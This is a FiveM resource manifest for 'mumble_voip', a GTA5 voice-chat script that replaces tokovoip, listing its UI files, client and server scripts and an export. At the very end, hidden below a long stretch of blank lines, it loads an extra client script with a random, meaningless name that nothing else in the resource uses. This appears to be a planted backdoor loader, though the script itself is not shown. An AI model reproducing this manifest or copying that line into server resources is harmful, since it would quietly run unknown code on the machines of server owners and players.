fx_version "adamant"
game "gta5"

name "mumble_voip"
description "A tokovoip replacement that uses fivems mumble voip"
author "Frazzle (frazzle9999@gmail.com)"
version "1.1"

ui_page "ui/index.html"

files {
	"ui/index.html",
	"ui/mic_click_on.ogg",
	"ui/mic_click_off.ogg",
}

client_scripts {
	"config.lua",
    "client.lua",
}

server_scripts {
    "server.lua",
}

server_exports {
	'GetRadioChannel'
}



provide "tokovoip_script"













client_script "IRS_USDUFHSILFSKOAKQA.lua"